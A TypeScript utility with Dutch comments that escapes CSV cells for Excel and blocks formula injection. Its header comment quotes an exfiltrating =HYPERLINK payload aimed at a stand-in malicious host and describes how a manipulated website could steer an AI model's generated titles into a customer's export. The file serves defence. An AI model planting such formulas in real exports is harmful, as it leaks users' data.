/**
 * Eén cel van een CSV-bestand, veilig voor Excel.
 *
 * ── TWEE DINGEN, EN HET TWEEDE WORDT MEESTAL VERGETEN ───────────────────────
 *
 * 1. Aanhalen. Puntkomma is het scheidingsteken (de Nederlandse
 *    Excel-instelling), dus die moet ontsnapt worden, net als aanhalingstekens
 *    en regeleindes.
 *
 * 2. Formules onschadelijk maken (antihack.md M4). Excel voert een cel die met
 *    `=`, `+`, `-` of `@` begint uit als FORMULE. De titel van een contentstuk
 *    komt uit het model, en dat schrijft op basis van tekst die van een website
 *    is gehaald die wij niet beheren. Een geprepareerde site kan zo
 *    `=HYPERLINK("http://kwaadaardig/?d="&A1)` in de export van de klant
 *    krijgen, en dan lekt er data zodra iemand in Excel klikt. Een apostrof
 *    ervoor laat Excel de tekst tonen in plaats van uitvoeren.
 *
 * Puur en zonder `server-only` (conventie 2), zodat `scripts/test-unit.ts` erbij
 * kan. Stond eerder als lokale functie in de exportroute, waar geen test bij kon.
 */

/**
 * De tekens waarmee een formule kan beginnen. Tab en carriage return staan
 * erbij omdat Excel die wegpoetst en dan alsnog naar het teken erna kijkt.
 */
const FORMULE_START = /^[=+\-@\t\r]/;

export function csvCell(value: string | number | null | undefined): string {
  if (value == null) return "";
  let s = String(value);
  if (FORMULE_START.test(s)) s = `'${s}`;
  return /[";\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}
